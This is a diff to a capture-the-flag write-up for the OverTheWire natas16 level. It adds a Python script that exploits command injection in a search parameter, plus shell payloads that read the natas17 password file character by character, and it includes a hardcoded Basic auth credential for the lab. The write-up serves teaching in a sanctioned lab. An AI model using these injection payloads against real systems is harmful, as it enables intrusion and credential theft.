@@ -60,7 +60,6 @@ def get_common_letter(words_list):
     """
     Gets a list of words and returns the letter that appeared in all the words.
     """
-
     # If the list is empty, it is a sign that a digit has been extracted.
     if not words_list: return '_'
     
@@ -94,6 +93,80 @@ Take the code above and copy it into a Python file. Run it, and you will get the
 <img src="./6.png"></img>
 
 So these are the characters of the password in case insensitive form, where each underscore represents a place of a digit: `xkeuche_sbnkbvh_ru_ksib_uulmi_sd`
+
+Our next goal will be to get the digits. The idea is to produce a code that extracts a digit, turns it into a letter, and according to the letter we can reproduce the digit.<br />
+'0' --> 'a', '1' --> 'b' and so on.<br /> 
+We know that the fourth character in the password for **natas16** (the current challenge) is the digit '7'. We will create the code and check that the letter that is discovered will be 'h'.
+
+I used the following [source](https://stackoverflow.com/questions/12855610/shell-script-is-there-any-way-converting-number-to-char) to export the code `$(printf \\$(printf %03o $((97+$(cut -c 4-4 /etc/natas_webpass/natas16)))))`. And this is the output:
+
+<img src="./7.png"></img>
+
+The letter common to all words is 'h'. And from this we conclude that the extracted character was the digit '7'. We already know the password, so we know that it is really true. Now we will create a Python code that goes through all the characters that are "_" in the password, and extracts the respective digits for them:
+
+```python
+from requests import post
+from requests.utils import quote
+
+PASSWORD_FILENAME = '/etc/natas_webpass/natas17'
+PASSWORD_LENGTH = 32
+DIGIT_EXTRACTION = "$(printf \\\$(printf %03o $((97+$(cut -c {}-{} {})))))"
+
+# details for the POST HTTP request.
+URL = "http://natas16.natas.labs.overthewire.org/index.php"
+HEADERS ={}
+HEADERS["Authorization"] = "Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg=="
+HEADERS["Content-Type"] = "application/x-www-form-urlencoded"
+DATA = "needle="
+
+def get_dictionary_words(html):
+    """
+    Returns a list of all the words that appeared as output
+    from dictionary.txt in the html page
+    """
+    html = html.lower()
+    return html[html.find('<pre>')+6:html.find('</pre>')].split('\n')[:-1]
+
+def get_common_letter(words_list):
+    """
+    Gets a list of words and returns the letter that appeared in all the words.
+    """
+    # If the list is empty, it is a sign that a digit has been extracted.
+    if not words_list: return '_'
+    
+    # Takes the shortest word, because then the test will be faster.
+    words_list.sort(key=len)
+    shortes_word = words_list[0]
+    
+    # If the short word contains one letter, then it is common to all.
+    if(len(shortes_word) == 1): return shortes_word
+    
+    # Looking for the letter that appears in all the words:
+    for letter in shortes_word:
+        is_common = True  
+        
+        for word in words_list:
+            if letter not in word:
+                is_common = False
+                break
+
+        if is_common: return letter
+
+password = "xkeuche_sbnkbvh_ru_ksib_uulmi_sd"
+while('_' in password):
+    i = password.find('_')
+    res = post(url=URL, headers=HEADERS, data=DATA+quote(DIGIT_EXTRACTION.format(i+1, i+1, PASSWORD_FILENAME)))
+    letter = get_common_letter(get_dictionary_words(res.text))
+    digit = str(ord(letter) - ord('a'))
+    password = password.replace('_', digit, 1)
+    print("password: " + password.ljust(32, "_"))
+```
+
+Take the code above and copy it into a Python file. Run it, and you will get the following output:
+
+<img src="./8.png"></img>
+
+
 
 # exstract spesific letter from password
 `$(cut -c 1-1 /etc/natas_webpass/natas17)`
